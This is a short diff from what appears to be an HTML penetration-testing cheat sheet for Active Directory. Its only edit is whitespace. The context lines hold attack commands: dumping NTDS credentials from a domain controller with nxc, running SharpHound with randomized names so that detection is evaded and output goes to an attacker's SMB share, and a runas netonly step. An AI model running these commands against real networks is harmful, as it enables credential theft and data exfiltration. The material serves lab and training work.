@@ -7788,7 +7788,7 @@ proxychains4 -q nxc smb [dc-ip] -u 'DC01$' -p '' --ntds</code></pre>
 
 <ul><li>Randomize and hide output artifacts (defeat <code>.json</code>/<code>.bin</code>/zip naming signatures):</li></ul>
 <pre><code class="language-powershell">.\SharpHound.exe -c All --memcache --randomfilenames --outputprefix HTB `
-  --outputdirectory \\[attacker-ip]\share\ --zippassword [password]</code></pre>
+--outputdirectory \\[attacker-ip]\share\ --zippassword [password]</code></pre>
 
 <ul><li>From a non-domain-joined attack box, launch in a netonly context first:</li></ul>
 <pre><code class="language-powershell">runas /netonly /user:[domain]\[user] cmd.exe
